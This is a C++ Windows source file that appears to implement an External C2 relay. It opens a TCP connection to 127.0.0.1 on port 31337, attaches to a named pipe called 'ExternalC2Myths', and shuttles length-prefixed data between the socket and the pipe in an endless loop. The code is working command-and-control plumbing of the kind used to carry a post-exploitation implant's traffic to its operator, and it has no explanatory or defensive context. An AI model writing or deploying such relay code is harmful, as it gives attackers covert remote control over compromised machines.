#include <iostream>
#include <string>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define BUFFER_MAX_SIZE 1024 * 1024
using namespace std;

int SendData( SOCKET sock, char* DATA, DWORD DataLength ) {
    send (sock, (char*)&DataLength , 4, 0 );
    printf( "[*] Sending Data Size: %i, \t Data: %s\n", sizeof DATA, DATA);

    return send( sock, DATA, DataLength , 0 );
}

int RecData(SOCKET sock, char *DATA) {

    DWORD  total = 0, temp = 0;

    int size = 0;

    recv(sock, (char*)&size, 4, 0);
    printf("[*] Data Size: %i\n", size);

    while (total < size) {
        temp = recv(sock, DATA + total, size - total, 0);
        total += temp;
    }

    return size;
}


void WriteData( HANDLE hNamedPipe, char* DATA, DWORD DataLength ) {

    DWORD wrote = 0;

    WriteFile( hNamedPipe, ( void* )&DataLength, 4, &wrote, 0 );
    FlushFileBuffers(hNamedPipe);

    WriteFile( hNamedPipe, DATA, DataLength, &wrote, 0 );
    FlushFileBuffers(hNamedPipe);
    
    printf( "[*] Wrote Data: %s ,Data Size: %i\n", DATA, wrote);

}

DWORD ReadData( HANDLE hNamedPipe, char* DATA ) {
    
    DWORD  temp = 0;

    int size = 0, total = 0;

    ReadFile(hNamedPipe, (char*)&size, 4, &temp, 0);

    printf("[*] Reading Data Size: %i\n", size);


    while (size > total) {

        ReadFile(hNamedPipe, DATA + total, size - total, &temp, 0);
        total += temp;
        printf("[*] Data: %s\n", DATA);
        printf("[*] Total : %i\n", total);
        printf("[*] Size : %i\n", size);

    }

    return size;
}


SOCKET Connect(string ipAddress, int port) {



    WSAData data;
    WORD    ver = MAKEWORD(2, 2);
    int     wsResult = WSAStartup(ver, &data);

    if (wsResult != 0)
    {
        printf("Can't start Winsock, Err # %i\n", wsResult);
        return 0 ;
    }

    SOCKET  sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Can't create socket, Err # %i\n", WSAGetLastError());
        WSACleanup();
        return 0 ;
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);


    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));

    if (connResult == SOCKET_ERROR)
    {
        printf("Can't connect to server, Err #%i\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    return sock;

}


void main()
{
    string ipAddress = "127.0.0.1";
    int port = 31337;
    DWORD dwRead;

    SOCKET sock = Connect( ipAddress, port );
    
    char *buf = ( char* )malloc( BUFFER_MAX_SIZE );
    string RecResults = "Check";

    HANDLE hNamedPipe =  INVALID_HANDLE_VALUE;
    while ( hNamedPipe == INVALID_HANDLE_VALUE )
    { 
        hNamedPipe = CreateFileA( "\\\\.\\pipe\\ExternalC2Myths", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL );
    }

    while ( TRUE ) {
        printf( "=======================================\n" );
        int bytesReceived = RecData( sock, buf );
        if ( bytesReceived > 0 )
        {
            printf( "[*] Receiving Data: %s\n", string( buf, 0, bytesReceived ).c_str() );
        }

        // Write and Read From Named pipe

        WriteData( hNamedPipe, buf, bytesReceived );

        dwRead = ReadData( hNamedPipe, buf );

        printf( "[*] Reading Size: %i\n", dwRead );

        // Process the read and write for Named pipe.

        int sendResult = SendData( sock, buf, dwRead );

        if ( sendResult != SOCKET_ERROR )
        {
            printf( "[*] Data Sent\n" );
        }
    }

    closesocket( sock );
    WSACleanup();
}